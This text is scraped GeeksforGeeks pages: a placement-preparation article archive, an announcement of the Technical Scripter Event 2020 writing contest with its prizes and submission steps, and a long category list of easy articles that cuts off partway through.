placement preparation Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wisePractice for cracking any coding interviewTop 10 algorithms in Interview QuestionsCommonly Asked Data Structure Interview Questions | Set 1A Step by Step Guide for Placement Preparation | Set 1Top 20 Dynamic Programming Interview QuestionsCommonly Asked C Programming Interview Questions | Set 1Commonly Asked OOP Interview Questions | Set 1Amazon Interview QuestionsCommonly Asked C++ Interview Questions | Set 1Top 25 Interview QuestionsTop 20 Linked List Interview QuestionData Structures and Algorithms Online Courses : Free and PaidSQL Interview QuestionsMust Do Questions for Companies like TCS, CTS, HCL, IBM …TCS Placement Paper | MCQ 1Commonly Asked C Programming Interview Questions | Set 2Commonly Asked Algorithm Interview Questions | Set 1Amazon’s most frequently asked interview questions | Set 2Placement Preparation GuideTop 20 Hashing Technique based Interview QuestionsCognizant ( CTS ) Placement PreparationTop 10 Interview Questions on Depth First Search (DFS)Placement 100 : Complete Interview Preparation package you must have this Placement SeasonHow to Prepare for Amazon Software Development Engineering Interview?Commonly Asked C++ Interview Questions | Set 2Cognizant Placement Paper | Aptitude Set 1TCS Interview QuestionsTCS Placement Preparation Tag Archives: placement preparation Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, … Last Updated: 10-11-2020 3.4 As the placement season is back so are we to help you ace the interview. We have selected some most commonly asked and must do… Read More » Articlesinterview-preparationplacement preparation Must Do Coding Questions Company-wise Last Updated: 28-10-2020 3.3 Topic : Google Facebook Microsoft Adobe Oracle Amazon D E Shaw MAQ Software Directi Yahoo Accolite Walmart Labs Samsung Paytm Ola Cabs Flipkart SAP Labs… Read More » Articlesinterview-preparationplacement preparation TCS Interview Questions Last Updated: 01-08-2020 5 TCS is a great place to start your career as a fresher. It offers a great workplace as well as a friendly environment with a… Read More » CS - Placementsinterview-preparationplacement preparationTCS Aptitude for Placements Last Updated: 10-05-2020 3.5 Nowadays, in this new era of Internet everything is being performed online. Whether it be bill payments, shopping, studying etc. everything is being handled and… Read More » Computer SubjectGBlogCareer-Advicesplacementplacement preparation Google Interview Preparation For Software Engineer – A Complete Guide Last Updated: 22-10-2019 4.5 Google… The top attractive employer and one of the highest paying companies in the world. Google opens a door for exceptional programmers who are not… Read More » GBlogGoogleInterview Tipsinterview-preparationplacement preparation Geek Week – Celebrate The Biggest Programming Festival With GeeksforGeeks Last Updated: 27-11-2019 3 Every programmer has a dream they want to fulfill. Now that dream for you could be working at the top product-based companies in the world… Read More » GBlogCareer-AdvicesGFG-CourseGFG-Updateplacement preparation How to Prepare for Amazon Software Development Engineering Interview? Last Updated: 28-10-2020 4.2 Amazon… “Hire and Develop the Best”. One of the Big Four Tech Companies who cares a lot about their Leadership Principles when it comes to… Read More » GBlogAmazonInterview Tipsinterview-preparationplacement preparation Learn with GeeksforGeeks Course – Best Courses To Land Job In Your Dream Company Last Updated: 18-03-2020 3.4 Please refer GeeksforGeeks Courses for the latest list of courses. Do you want to learn more about Data Structures and Algorithms to help in your… Read More » GBlogCareer-AdvicesGFG-Courseplacement preparation Live Classes for Data Structures and Algorithms: Interview Preparation Focused Course Last Updated: 28-09-2019 3 Engineers have the power to change the world by solving real-world problems but underneath its DSA that plays a crucial role in solving all the… Read More » AlgorithmsGBloginterview-preparationplacement preparation Advanced SQL Interview Questions Last Updated: 18-09-2019 3 Different companies have a different approach to their interviewing process. Some would be concentrating on work experience and knowledge; others might focus on personality, while… Read More » DBMSSQLInterview Tipsinterview-preparationplacement preparation AMCAT Mock Paper | Verbal Aptitude 2 Last Updated: 26-08-2019 CONTENT REMOVED Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly… Read More » ArticlesPlacementsplacement preparation AMCAT Mock Paper | Quantitative Aptitude 4 Last Updated: 26-08-2019 CONTENT REMOVED Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly… Read More » ArticlesPlacementsplacement preparation AMCAT Mock Paper | Quantitative Aptitude 5 Last Updated: 26-08-2019 1.5 CONTENT REMOVED Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly… Read More » ArticlesPlacementsplacement preparation AMCAT Mock Paper | Verbal Aptitude 1 Last Updated: 26-08-2019 CONTENT REMOVED Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly… Read More » ArticlesPlacementsplacement preparation AMCAT Mock Paper | Verbal Aptitude 5 Last Updated: 26-08-2019 CONTENT REMOVED Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly… Read More » ArticlesPlacementsplacement preparation Page 1 of 1112345...10...»Last » Most popular in placement preparation English Reading Comprehension | Set 1How to Prepare for HR InterviewsHow to prepare for eLitmus Hiring Potential Test (pH Test)Advanced SQL Interview QuestionsTCS Placement Paper | MCQ 10 Most visited in placement preparation Top 20 Backtracking Algorithm Interview QuestionsHow to prepare for Google Kickstart - a CodeJam competition?Commonly Asked C Programming Interview Questions | Set 3Top 20 Greedy Algorithms Interview Questions10 Most asked Questions from Java Programmers room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Technical Scripter Event 2020 By GeeksforGeeks - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Technical Scripter Event 2020 By GeeksforGeeksThe Technical Scripter Event 2019 By GeeksforGeeksWrite From Home Challenge – Technical Content Writing Event By GeeksforGeeksHow to Attempt and Analyse Mock CAT?Avoid these mistakes while preparing for the CAT ExamMust know things for CAT Exam 2019; Eligibility Criteria, Important Dates and SyllabusCAT Preparation 2019: A Complete Preparation Package You Require for Cracking CAT 2019CAT 2019 Preparation Strategy : How to Ace the CAT Exam in 4 MonthsWhat are the Daily Habits for Successful CAT Preparation?Special 21 – Coding Interview Preparation in 21 Days LockdownGet Your Dream Job With Amazon SDE Test SeriesAmazon Interview Experience | Set 414 (For SDET-1)Amazon interview Experience | Set 413 (SDET-1 On-Campus Internship)Amazon Interview Experience | Set 432 (SDET Off – Campus)How to Prepare for Amazon Software Development Engineering Interview?Resume Writing For InternshipMust Do Coding Questions for Companies like Amazon, Microsoft, Adobe, …Must Do Coding Questions Company-wisePractice for cracking any coding interviewHow to begin with Competitive Programming?Top 10 Algorithms and Data Structures for Competitive ProgrammingN Queen Problem | Backtracking-3Printing all solutions in N-Queen ProblemWarnsdorff’s algorithm for Knight’s tour problemThe Knight’s tour problem | Backtracking-1Socket Programming in C/C++GET and POST requests using PythonTop 10 Projects For Beginners To Practice HTML and CSS SkillsFast I/O for Competitive ProgrammingOOPs | Object Oriented Design Technical Scripter Event 2020 By GeeksforGeeks Last Updated: 06-11-2020 Everyone knows that the tech enthusiasts hold a strong passion for reading articles – whether it be about their specific domain, cutting-edge technologies, source codes & programs, or any other (and yes, it’s really a good practice!!). However, the thing which only a few know is that these tech geeks often like to articulate their learnings or showcase their expertise in a particular area through their writings and want to share it with the right audience as well. Although, due to the lack of opportunities or resources, most of the individuals don’t even get a single chance to showcase their technical & writing skills. But like always, GeeksforGeeks has got your back and is coming up with a great opportunity i.e., Technical Scripter Event where all the geeks out there can showcase their technical & writing skills and can share it with anyone across the world! Moreover, you don’t need to step out of your house to participate in the event as you can write and submit your article sitting at your home. And yes, all the participants of the Technical Scripter Event will be rewarded with some exciting prizes too. A renowned platform, a worthwhile opportunity, ease of participation, and interesting prizes – What else you need? Technical Scripter Event Details The Technical Scripter Event will give you a chance to write and submit Technical Blogs or Articles based on any topic in the computer science world like trending technologies, programming languages, etc. However, you must remember that the topic should not be already covered on GeeksforGeeks. Also, there are not any eligibility criteria or entry fees to participate in the event i.e., anyone can take part in the Technical Scripter Event. Furthermore, if we talk about Results, the winners would be declared on the basis of Public Voting for the selected topics. Check out the last year’s winners from Technical Scripter 2019 Winners. Event Date: 20 Oct 2020 – 19 Jan 2021 Topics to Write On You can write on any computer science topic in the Technical Scripter Event. However, this topic should not previously exist on GeeksforGeeks. If you are not sure about which topic you want to write on, then go to Write On Suggested Topic. There you can select the topic you want to write on by clicking on the Write option and then selecting Pick for Technical Scripter. Some of the different types of topics that you can select are mentioned in the list below. You can refer to them in case you are confused about which topic to pick but you are by no means restricted to only these topics. Algorithms & Data Structures Competitive Programming Programming Languages (C, C++, Java, Python, C#, Perl, Ruby, Scala, Go, Web Technology, etc.) Machine Learning, Big Data & Hadoop and Data Science Computer Science Subjects Tech Tips and Tricks Linux Hacks Secure Coding Technical Blogs Design based articles Cracking Technical Interviews Android School Learning Note: Articles on library functions are not accepted under the Technical Scripter Event. Why You Should Participate? By all means, the Technical Scripter Event is not only about writing tech articles and winning prizes but it is something bigger than that. Let’s take a look at several noteworthy benefits that you can gain from the Technical Scripter Event: As you’ll be required to study the topic or subject in-depth before writing the Technical Scripter Event, hence it’ll surely enhance your knowledge and provide you the expertise in the particular niche. The top 50 participants of the Technical Scripter Event will also get the internship opportunity at GeeksforGeeks. In the end, the thing which will matter more than the prizes is the utmost experience and exposure you’d gain from the event. Also, it will add value to your resume and give you an edge over others during placement opportunities. Note: In case of any issues, GeeksforGeeks holds the right to the final decision. Prizes to be Won Indeed, the rewards and prizes are the best way to encourage the efforts of participants & motivates them to participate in the future as well. Hence, there are many Cash Prizes and Goodies for all the participants in the Technical Scripter Event: 1st Prize: INR 10,000 Cash Prize + GeeksforGeeks Goodies’ bag + Certificate + In-Office Internship opportunity + INR 500 OFF coupon valid on all courses 2nd Prize: INR 7,500 Cash Prize + GeeksforGeeks Goodies’ bag + Certificate + In-Office Internship opportunity + INR 500 OFF coupon valid on all courses 3rd Prize: INR 5,000 Cash Prize + GeeksforGeeks Goodies’ bag + Certificate + In-Office Internship opportunity + INR 500 OFF coupon valid on all courses 4th Prize: INR 2,000 Cash Prize + GeeksforGeeks Goodies’ bag + Certificate + In-Office Internship opportunity + INR 500 OFF coupon valid on all courses 5th Prize: INR 2,000 Cash Prize + GeeksforGeeks Goodies’ bag + Certificate + In-Office Internship opportunity + INR 500 OFF coupon valid on all courses 6th -10th Prize: GeeksforGeeks Goodies’ bag + In-Office Internship opportunity + INR 500 OFF coupon valid on all courses 11th -50th Prize: Goodies(2 Pens, 1 GeeksforGeeks Sticker) + In-Office Internship opportunity + INR 500 OFF coupon valid on all courses Assured Reward*: Goodie (2 Pens, 1 GeeksforGeeks Sticker) + INR 500 OFF coupon valid on all courses. * Each participant who manages to publish at least one article will be rewarded. Note: The Cash Prizes are not Applicable for the Participants Outside India. How to Submit Your Article? The process of writing and submitting the article for the Technical Scripter Event is quite easy- yes, all you need to do is follow the step-by-step procedure mentioned below: 1. Click on https://write.geeksforgeeks.org/ and write & submit your article under Write in Technical-Scripter. 2. If you are confused or don’t have any topic to write on, then Click on https://write.geeksforgeeks.org/ and Go to Write On Suggested Topic. Then you can select the topic you want to write on by clicking on the WRITE option and then selecting Pick for Technical Scripter as shown in the image. 3. You can use these guidelines to write the article – https://write.geeksforgeeks.org/how-to-write/ 4. Any plagiarism detected in the article will disqualify you from the event. 5. In case of any doubt please contact your respective Campus Ambassador or you can also drop a mail to contribute@geeksforgeeks.org Needless to say, the Technical Scripter Event is a striking opportunity to enhance your technical and writing skills with a chance to win some exciting prizes which are just like icing on the cake!! My Personal Notes arrow_drop_up Save Recommended Posts:The Technical Scripter Event 2019 By GeeksforGeeksWrite From Home Challenge - Technical Content Writing Event By GeeksforGeeksTop 5 Common Mistakes in Technical On-site InterviewsHow to get started for technical Interviews?Socio-technical Systems13 Technical Skills You Should Have As A Developer8 Technical Courses To Get a Job in ITDifference between Research Papers and Technical Articles for Journal PublicationHow to Practice for the Technical Rounds in Interview?13 Mistakes To Avoid During Technical Interview7 Essential Tips To Become A Good Technical Leader7 Most In-Demand Technical Skills By Companies After COVID-19What is Technical Debt in Software Development and How to Manage It?Technical Documentation - Types, Required Skills, ChallengesGeeksforGeeks Skill-Dependence Days 2020 - A Battle Against UnemploymentDifference between Project Management and Event ManagementWhat is an event loop in JavaScript ?GRE General Practice Test Series 2019 | GeeksforGeeksGeek Week – Celebrate The Biggest Programming Festival With GeeksforGeeksLearn with GeeksforGeeks Course - Best Courses To Land Job In Your Dream Company Article Tags : GBlogGFG-UpdateTechnical Scripter 2020 thumb_up 33 To-do Done 2 Based on 11 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Geek Week 2020 – The Biggest Festival for Programmers is Back Next last_page 10 Popular IoT Home Devices in 2020 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in GBlog 100 Days of Code - A Complete Guide For Beginners and ExperiencedWhy Java Language is Slower Than CPP for Competitive Programming?Differences between Procedural and Object Oriented ProgrammingSupervised and Unsupervised learningTypes of Software Testing More related articles in GBlog XML parsing in PythonWorking with csv files in PythonVirtualization | A Machine Reference ModelDifference between FAT32, exFAT, and NTFS File SystemGenetic Algorithms room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

All Easy Articles Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects All Easy Articles Select Category All Categories Accenture; Accolite; Adobe; Advanced Computer Subject; Advanced Data Structure; AKTU-question-papers; Algebra; Algorithms; Algorithms-Analysis of Algorithms; Algorithms-Bit Algorithms; Algorithms-Dynamic Programming; Algorithms-Graph Shortest Paths Quiz; Algorithms-Graph Traversals; Algorithms-Greedy Algorithms; Algorithms-Misc; Algorithms-Recursion; Algorithms-Sorting-Quiz; Amazon; Amazon-Question; Amdocs; American Express; Anagram; Analysis; Analysis of Algorithms; Android; AngularJS; AngularJS-Directives; AngularJS-Misc; Apache; Aptitude; Aptitude-GATE CS 1998; Aptitude-Puzzles; Aptitude-Wipro Mock Test; Arcesium; Area-volume-programs; Arithmetic progression; Array-range-queries; Array-rearrange; Array-traversal-question; Arrays; Arrays; Articles; Artificial Intelligence; ASCII; ASP-Properties; AWS; Backtracking; Barclays; Base-conversion; BFS; BigData; Binary Indexed Tree; Binary Search; Binary Search Tree; Binary Search Trees; Binary Tree; Binary Trees Quiz; Binary-representation; Binary-string; Binomial coefficient; BIT; Bit Algorithms; Bit Magic; Bitonic; Bitwise-AND; Bitwise-OR; Bitwise-XOR; BlockChain; Bootstrap; Bootstrap-4; Bootstrap-Misc; Bulma; C; C Basics; C Programs; C#; C# Programs; C++; C++ Programs; C++-Constructors; C++-Inheritance; C-Arrays; C-Data Types; C-Dynamic Memory Allocation; C-File Handling; C-Functions; C-graphics; C-Input and Output Quiz; C-Library; C-Loops & Control Structure; C-Macro & Preprocessor; C-Operators; C-Output; C-Pointers; C-puzzle; C-Storage Classes and Type Qualifiers; C-String; C-String-Question; C-Structure & Union; C-Variable Declaration and Scope; Capgemini; Career-Advices; CAT; Catalan; CBSE - Class 11; Chessboard-problems; Circle; Circular linked list; Circular-array; Cisco; Citrix; Class 10; Class 11; Class 12; Class 8; Class 9; Cloud-Computing; Codenation; Cognizant; Cognizant-interview-experience; Collect.js; Combinatorial; Combionatrics; Competitive Programming; Compiler Design; Complement; Computer Networks; Computer Networks-Network Layer; Computer Organization & Architecture; Computer Organization and Architecture; Computer Subject; Computer-graphics; Constructive Algorithms; Constructors; Cpp-advanced; Cpp-algorithm-library; Cpp-array; CPP-Basics; CPP-bitset; Cpp-boost; Cpp-class; Cpp-constructor; Cpp-containers-library; Cpp-data-types; Cpp-deque; Cpp-file-handling; CPP-forward-list; CPP-Functions; Cpp-input-output; Cpp-ios; Cpp-iterator; CPP-Library; Cpp-list; Cpp-manipulators; Cpp-map; Cpp-math; Cpp-multimap; Cpp-multiset; Cpp-multithreading; Cpp-numerics-library; Cpp-operator; CPP-Output; Cpp-pair; Cpp-pointer; Cpp-priority-queue; Cpp-puzzle; Cpp-queue; CPP-regex; Cpp-set; Cpp-stack; Cpp-string; Cpp-strings; Cpp-strings-library; Cpp-structure; Cpp-template; Cpp-unordered_map; Cpp-unordered_map-functions; Cpp-unordered_multimap; Cpp-unordered_multiset; Cpp-unordered_set; Cpp-unordered_set-functions; Cpp-valarray; Cpp-vector; Cpu-scheduling; Cryptography; CSharp Convert Class; CSharp DateTime Struct; CSharp LINQ; CSharp Multithreading; CSharp-8.0; CSharp-Arrays; CSharp-Basics; CSharp-Char-Struct; CSharp-Collections-ArrayList; CSharp-Collections-BitArray; CSharp-Collections-Hashtable; CSharp-Collections-Namespace; CSharp-Collections-SortedList; CSharp-Console-Class; CSharp-DateTimeOffset-Struct; CSharp-Decimal-Struct; CSharp-File-Handling; CSharp-Generic-HashSet; CSharp-Generic-List; CSharp-Generic-Namespace; CSharp-Generic-SortedSet; CSharp-keyword; CSharp-Math; CSharp-MathF-Class; CSharp-method; CSharp-OOP; CSharp-Specialized-HybridDictionary; CSharp-Specialized-Namespace; CSharp-string; CSharp-Tuple; CSharp-Type-Class; CSharp-Uri-Class; CSharp-ValueTuple; CSharp-ValueTuple-Methods; CSharp-Windows-Forms-Namespace; CSS; CSS-Advanced; CSS-Basics; CSS-Functions; CSS-Misc; CSS-Properties; CSS-Selectors; Cyber-security; D-E-Shaw; D3.js; Dart; Data Link Layer; Data mining; Data Structures; Data Structures-Heap; Data Structures-Linked List; Data Structures-Tree Traversals; Data Visualization; Data-science; Date-time-program; DBMS; DBMS-SQL; DE Shaw; Deep-Learning; Dell; Deloitte; Deque; Design Pattern; Deutsche Bank; DFS; Difference Between; Digit-DP; Digital Electronics & Logic Design; Dijkstra; Directi; Discrete Mathematics; Distributed System; Divide and Conquer; Divisibility; Divisors; Django-forms; Django-models; Django-REST; Docker Container; Doubly linked list; Dynamic Programming; ElectronJS; Encoding-decoding; Engineering Mathematics; ES6; Euler-totient; Exception Handling; Expedia; Experienced; Express.js; Expression-evaluation; Fabric.js; Facebook; Factor; Factorial; FactSet; Fibonacci; File & Disk Management; Flipkart; Flutter; Flutter-widgets; Fraction; Frequency-counting; Full Form; Functions; Game Theory; GATE 2017 Mock; GATE 2017 MOCK II; GATE CS; GATE CS 1996; GATE CS 1997; GATE CS 1998; GATE CS 1999; GATE CS 2018; GATE IT 2004; Gate IT 2005; GATE IT 2006; Gate IT 2007; Gate IT 2008; GATE-CS-2000; GATE-CS-2001; GATE-CS-2002; GATE-CS-2003; GATE-CS-2004; GATE-CS-2005; GATE-CS-2006; GATE-CS-2007; GATE-CS-2008; GATE-CS-2009; GATE-CS-2010; GATE-CS-2011; GATE-CS-2012; GATE-CS-2013; GATE-CS-2014-(Set-1); GATE-CS-2014-(Set-2); GATE-CS-2014-(Set-3); GATE-CS-2015 (Set 1); GATE-CS-2015 (Set 2); GATE-CS-2015 (Set 3); GATE-CS-2016 (Set 1); GATE-CS-2016 (Set 2); GATE-CS-2017 (Set 1); GATE-CS-2017 (Set 2); GATE-CS-DS-&-Algo; GATE-GATE 2017 Mock; GATE-GATE 2017 MOCK II; GATE-GATE CS 1996; GATE-GATE CS 1997; GATE-GATE CS 1999; GATE-GATE CS 2008; GATE-GATE CS 2010; GATE-GATE CS 2011; GATE-GATE CS 2012; GATE-GATE CS 2013; GATE-GATE CS 2018; GATE-GATE IT 2004; GATE-Gate IT 2005; GATE-GATE IT 2006; GATE-Gate IT 2007; GATE-Gate IT 2008; GATE-GATE-CS-2000; GATE-GATE-CS-2001; GATE-GATE-CS-2002; GATE-GATE-CS-2003; GATE-GATE-CS-2004; GATE-GATE-CS-2005; GATE-GATE-CS-2006; GATE-GATE-CS-2007; GATE-GATE-CS-2009; GATE-GATE-CS-2014-(Set-1); GATE-GATE-CS-2014-(Set-2); GATE-GATE-CS-2014-(Set-3); GATE-GATE-CS-2015 (Set 1); GATE-GATE-CS-2015 (Set 2); GATE-GATE-CS-2015 (Set 3); GATE-GATE-CS-2016 (Set 1); GATE-GATE-CS-2016 (Set 2); GATE-GATE-CS-2017 (Set 1); GATE-GATE-CS-2017 (Set 2); GBlog; GCD-LCM; GE; Geek on the Top; Geometric; Geometric-Lines; GFacts; GFG-Course; GFG-Update; Git; GitHub; Go Language; Golang; GoLang-atomic; Golang-bits; Golang-Complex; Golang-fmt; Golang-io; Golang-Math; Golang-Program; Golang-reflect; Golang-Slices; Golang-strconv; Golang-String; GoLang-time; Goldman Sachs; Google; Google Sites; Google-AMP; Graph; Graph Traversals; Graph-connectivity; Graph-cycle; GRE; Greedy; Greedy Algorithms; Guava-Functions; HackWithInfy; Hadoop; Hash; HashTable; HCF; HCL; Heap; Hike; How To; HSBC; HTML; HTML and XML; HTML-Attributes; HTML-Basics; HTML-DOM; HTML-MathML; HTML-Methods; HTML-Misc; HTML-Property; HTML-SVG; HTML-Tags; HTML5; HTTP-headers; IBM; Image-Processing; InfoEdge; Informatica; Information-Security; Infosys; Infosys-InfyTQ; Infosys-interview-experience; Inheritance; Inorder Traversal; Insertion Sort; Internship; Interview Experiences; Interview Tips; Interview-preparation; Inversion; IoT; ISRO; Java; Java - util package; Java 8; Java Programs; Java-AbstractSequentialList; Java-advanced; Java-Array-Programs; Java-ArrayDeque; Java-ArrayList; Java-Arrays; Java-AtomicInteger; Java-AtomicLong; Java-AtomicReferenceArray; Java-AWT; Java-basics; Java-BigDecimal; Java-BigInteger; Java-BitSet; Java-Byte; Java-ByteBuffer; Java-Calendar; Java-Character; Java-CharBuffer; 